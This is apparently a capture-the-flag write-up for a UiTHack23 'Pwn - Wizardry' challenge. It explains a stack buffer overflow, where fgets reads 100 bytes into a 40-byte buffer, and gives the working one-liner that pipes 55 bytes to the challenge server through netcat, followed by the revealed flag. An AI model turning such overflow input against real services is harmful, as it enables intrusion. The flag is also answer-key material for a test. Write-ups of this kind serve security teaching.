> # Pwn - Wizardry
> > Pwn - 50pts
>
> Gryffindor has gotten their flag stolen by another house. Rumour has it that it is hidden behind this spell. <br>
> Break the spell to get the flag!
>
> Here is the [spell](src/spell).
>
> Connect with netcat
> ```command
> $ nc motherload.td.org.uit.no 6200
> ```

## Writeup
The signal handler calls the _print\_flag_ function when a segmentation fault occurs, so we will get the flag by breaking the program with a segmentation fault.

The program reads in 100 bytes with _fgets_, but the buffer it reads in to is only 40 bytes in size, making us able to overflow the buffer to crash the program (with a segmentation fault).

You get the flag by writing **more** than 54 bytes to the program.
```command
$ python3 -c "print('a'*55)" | nc motherload.td.org.uit.no 6200
Give me some input:
>> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
UiTHack23{W1ng4rd1um_l3vi0s4aa4}
```
